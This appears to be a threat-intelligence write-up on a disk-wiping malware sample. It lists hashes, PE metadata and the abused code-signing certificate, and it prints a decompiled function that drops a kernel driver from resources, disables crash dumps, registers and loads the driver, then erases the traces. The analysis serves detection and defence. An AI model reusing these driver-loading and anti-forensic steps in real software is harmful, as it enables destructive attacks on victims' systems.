1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 - metadata

```json
    "General": {
        "PE Type": "exe",
        "Entrypoint": "15232",
        "Entrypoint Section": ".text",
        "Header checksum": "0x1f2fd",
        "Verify checksum": "0x1f2fd",
        "Match checksum": "True",
        "Sig": "558bec83e4f881ec240500005356576a708d44246cc744241c000000006a0050c744242800000000c744241800000000c7442438",
        "imphash": "fe4a2284122da348258c83ef437fbd7b",
        "warning": "None",
        "Timestamp": "2022-02-23 01:48:53"
    },
```
<br /><br />
1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 - signed - T1553.002 Code Signing

```json
    "SignatureExtracted": {
        "CERT_0": {
            "CommonName": "Hermetica Digital Ltd",
            "OrganizationalUnit": "None",
            "Organization": "Hermetica Digital Ltd",
            "Locality": "Nicosia",
            "StateOrProvinceName": "None",
            "CountryName": "CY",
            "Start": "Apr 13 00:00:00 2021 GMT",
            "Ends": "Apr 14 23:59:59 2022 GMT",
            "SerialNumber": "16326917005263794892010201328953498860",
            "SerialNumberMD5": "94bc2ff3969d9775de508e1181318deb"
        }
    },
```
<br /><br />
0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da - metadata

```json
    "General": {
        "PE Type": "exe",
        "Entrypoint": "15232",
        "Entrypoint Section": ".text",
        "Header checksum": "0x2b718",
        "Verify checksum": "0x2b718",
        "Match checksum": "True",
        "Sig": "558bec83e4f881ec240500005356576a708d44246cc744241c000000006a0050c744242800000000c744241800000000c7442438",
        "imphash": "4233d97404e1fecedef6a46e0f7c09b9",
        "warning": "None",
        "Timestamp": "2021-12-28 00:37:16"
    },
```
<br /><br />
0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da - signed - T1553.002 Code Signing

```json
    "SignatureExtracted": {
        "CERT_0": {
            "CommonName": "Hermetica Digital Ltd",
            "OrganizationalUnit": "None",
            "Organization": "Hermetica Digital Ltd",
            "Locality": "Nicosia",
            "StateOrProvinceName": "None",
            "CountryName": "CY",
            "Start": "Apr 13 00:00:00 2021 GMT",
            "Ends": "Apr 14 23:59:59 2022 GMT",
            "SerialNumber": "16326917005263794892010201328953498860",
            "SerialNumberMD5": "94bc2ff3969d9775de508e1181318deb"
        }
    },
```
<br /><br />
Hermetica Digital Ltd - is company that was registered in Cyprus on 16/03/2021

![](https://raw.githubusercontent.com/qeeqbox/reports/main/wiper/files/company.png)

<br /><br />
sub_4029d0
```c
int __thiscall sub_4029D0(void *this)
{
  BOOL (__stdcall *Wow64DisableWow64FsRedirection)(PVOID *); // ebx
  HMODULE v2; // edi
  BOOL (__stdcall *IsWow64Process)(HANDLE, PBOOL); // esi
  HANDLE v4; // eax
  ULONGLONG v5; // rax
  DWORDLONG v6; // rax
  HRSRC v7; // eax
  HRSRC v8; // esi
  HGLOBAL v9; // eax
  void *v10; // eax
  int result; // eax
  WCHAR *v12; // ebx
  DWORD v13; // eax
  unsigned int v14; // ecx
  int v15; // esi
  WCHAR *v16; // ebx
  HANDLE v17; // eax
  void (__stdcall *v18)(LPCWSTR); // edi
  void *v19; // esi
  int v20; // esi
  const void *v21; // eax
  LONG v22; // edi
  const WCHAR *v23; // eax
  LPWSTR v24; // eax
  WCHAR SubKey[260]; // [esp+10h] [ebp-8A8h] BYREF
  wchar_t Destination[260]; // [esp+218h] [ebp-6A0h] BYREF
  struct _OFSTRUCT v27; // [esp+420h] [ebp-498h] BYREF
  struct _OFSTRUCT ReOpenBuf; // [esp+4A8h] [ebp-410h] BYREF
  WCHAR pszDest[260]; // [esp+530h] [ebp-388h] BYREF
  struct _OSVERSIONINFOEXW VersionInformation; // [esp+738h] [ebp-180h] BYREF
  int v31; // [esp+85Ch] [ebp-5Ch] BYREF
  int v32[13]; // [esp+860h] [ebp-58h]
  BOOL v33; // [esp+894h] [ebp-24h]
  int v34; // [esp+898h] [ebp-20h]
  int v35; // [esp+89Ch] [ebp-1Ch]
  DWORD nNumberOfBytesToWrite; // [esp+8A0h] [ebp-18h]
  LPCVOID lpBuffer; // [esp+8A4h] [ebp-14h]
  unsigned int v38; // [esp+8A8h] [ebp-10h]
  BYTE Data[4]; // [esp+8ACh] [ebp-Ch] BYREF
  int v40; // [esp+8B0h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+8B4h] [ebp-4h] BYREF

  Wow64DisableWow64FsRedirection = 0;
  v34 = (int)this;
  v33 = 0;
  v35 = 0;
  v40 = 0;
  v31 = 0;
  memset(pszDest, 0, sizeof(pszDest));
  v2 = GetModuleHandleW(L"kernel32.dll");
  v38 = wnsprintfW(pszDest, 260, L"\\??\\");
  if ( v2 )
  {
    Wow64DisableWow64FsRedirection = (BOOL (__stdcall *)(PVOID *))GetProcAddress(v2, "Wow64DisableWow64FsRedirection");
    GetProcAddress(v2, "Wow64RevertWow64FsRedirection");
    IsWow64Process = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(v2, "IsWow64Process");
    if ( IsWow64Process )
    {
      v4 = GetCurrentProcess();
      IsWow64Process(v4, &v40);
    }
  }
  memset(&VersionInformation, 0, sizeof(VersionInformation));
  VersionInformation.dwOSVersionInfoSize = 284;
  VersionInformation.dwMajorVersion = 6;
  VersionInformation.dwMinorVersion = 0;
  v5 = VerSetConditionMask(0i64, 2u, 3u);
  v6 = VerSetConditionMask(v5, 1u, 3u);
  if ( VerifyVersionInfoW(&VersionInformation, 3u, v6) )
  {
    if ( v40 )
      v7 = FindResourceW(hModule, L"DRV_X64", L"RCDATA");
    else
      v7 = FindResourceW(hModule, L"DRV_X86", L"RCDATA");
  }
  else
  {
    if ( GetLastError() != 1150 )
      return 0;
    v35 = 1;
    if ( v40 )
      v7 = FindResourceW(hModule, L"DRV_XP_X64", L"RCDATA");
    else
      v7 = FindResourceW(hModule, L"DRV_XP_X86", L"RCDATA");
  }
  v8 = v7;
  if ( !v7 )
    return 0;
  v9 = LoadResource(hModule, v7);
  if ( !v9 )
    return 0;
  lpBuffer = LockResource(v9);
  if ( !lpBuffer )
    return 0;
  nNumberOfBytesToWrite = SizeofResource(hModule, v8);
  if ( v40 && Wow64DisableWow64FsRedirection )
    Wow64DisableWow64FsRedirection((PVOID *)&v31);
  phkResult = 0;
  if ( !RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\CrashControl", &phkResult) )
  {
    *(_DWORD *)Data = 0;
    RegSetValueExW(phkResult, L"CrashDumpEnabled", 0, 4u, Data, 4u);
    RegCloseKey(phkResult);
  }
  wnsprintfW(Destination, 260, L"\\\\.\\EPMNTDRV\\%u", 0);
  v10 = (void *)sub_401870(Destination, 0, 0);
  if ( !v10 || v10 == (void *)-1 )
  {
    *(_DWORD *)Data = &pszDest[v38];
    if ( GetSystemDirectoryW(*(LPWSTR *)Data, 0x104u) )
    {
      PathAppendW(pszDest, L"Drivers");
      PathAddBackslashW(pszDest);
      v38 = 26;
      v12 = &pszDest[wcslen(pszDest)];
      do
      {
        v32[0] = 6422625;
        v32[1] = 6553699;
        v32[2] = 6684773;
        v32[3] = 6815847;
        v32[4] = 6946921;
        v32[5] = 7077995;
        v32[6] = 7209069;
        v32[7] = 7340143;
        v32[8] = 7471217;
        v32[9] = 7602291;
        v32[10] = 7733365;
        v32[11] = 7864439;
        v32[12] = 7995513;
        v13 = GetCurrentProcessId();
        v14 = (v13 + 1) % 0xFFF1;
        *v12 = *((_WORD *)v32 + (v14 + ((v14 % 0xFFF1) << 16)) % v38);
        v12[1] = *((_WORD *)v32
                 + ((v14 + v13) % 0xFFF1 + (((v14 % 0xFFF1 + (v14 + v13) % 0xFFF1) % 0xFFF1) << 16)) % 0x1A);
        StrCatBuffW(v12 + 1, L"drv", 4);
        v12[6] = 0;
      }
      while ( PathFileExistsW(pszDest) );
      v15 = PathFindExtensionW(v12) - v12;
      wcsncpy(Destination, v12, v15);
      v16 = *(WCHAR **)Data;
      Destination[v15] = 0;
      v17 = CreateFileW(v16, 0x40000000u, 0, 0, 2u, 0, 0);
      v18 = (void (__stdcall *)(LPCWSTR))DeleteFileW;
      v19 = v17;
      if ( v17 && v17 != (HANDLE)-1 )
      {
        phkResult = 0;
        if ( WriteFile(v17, lpBuffer, nNumberOfBytesToWrite, (LPDWORD)&phkResult, 0)
          && phkResult == (HKEY)nNumberOfBytesToWrite )
        {
          if ( v19 != (void *)-1 )
          {
            FlushFileBuffers(v19);
            CloseHandle(v19);
          }
        }
        else
        {
          CloseHandle(v19);
          DeleteFileW(v16);
        }
      }
      sub_4023C0(v16, v34);
      memset(&ReOpenBuf, 0, sizeof(ReOpenBuf));
      memset(&v27, 0, sizeof(v27));
      v20 = LZOpenFileW(v16, &ReOpenBuf, 2u);
      if ( v20 >= 0 )
      {
        PathAddExtensionW(pszDest, L".sys");
        v21 = (const void *)LZOpenFileW(v16, &v27, 0x1002u);
        lpBuffer = v21;
        if ( (int)v21 >= 0 )
        {
          v22 = LZCopy(v20, (INT)v21);
          LZClose(v20);
          LZClose((INT)lpBuffer);
          if ( v22 > 0 )
          {
            v23 = v16;
            if ( v35 )
              v23 = StrStrIW(v16, L"System32");
            v33 = sub_403930(v23, Destination);
            if ( v33 )
            {
              wsprintfW(SubKey, L"%s%s", L"SYSTEM\\CurrentControlSet\\services\\", Destination);
              RegDeleteKeyW(HKEY_LOCAL_MACHINE, SubKey);
            }
          }
          sub_4023C0(v16, v34);
          v18 = (void (__stdcall *)(LPCWSTR))DeleteFileW;
        }
        else
        {
          LZClose(v20);
        }
      }
      v18(v16);
      v24 = PathFindExtensionW(v16);
      if ( v24 )
      {
        *v24 = 0;
        v18(v16);
      }
    }
    result = v33;
  }
  else
  {
    CloseHandle(v10);
    result = 1;
  }
  return result;
}
```

## Websites status
- kremlin.ru is down
- government.ru is down
- mil.ru is down
- gov.ru is down

##  References
- [ESET](https://twitter.com/ESETresearch/status/1496581903205511181)
- [Threat Intelligence](https://twitter.com/threatintel/status/1496578746014437376)

